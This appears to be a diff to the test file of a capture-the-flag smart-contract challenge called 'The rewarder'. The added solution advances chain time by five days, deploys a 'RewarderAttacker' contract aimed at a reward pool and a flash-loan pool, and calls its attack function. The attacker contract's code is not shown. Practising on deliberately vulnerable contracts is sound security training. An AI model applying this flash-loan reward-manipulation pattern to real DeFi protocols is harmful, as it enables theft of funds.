@@ -59,6 +59,7 @@ describe('[Challenge] The rewarder', function () {
                 await rewardToken.balanceOf(users[i].address)
             ).to.be.eq(rewardsInRound.div(users.length));
         }
+        
         expect(await rewardToken.totalSupply()).to.be.eq(rewardsInRound);
 
         // Player starts with zero DVT tokens in balance
@@ -70,6 +71,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const attacker = await (
+            await ethers.getContractFactory("RewarderAttacker", player)
+          ).deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, rewardToken.address);
+          
+        await attacker.attack();
     });
 
     after(async function () {
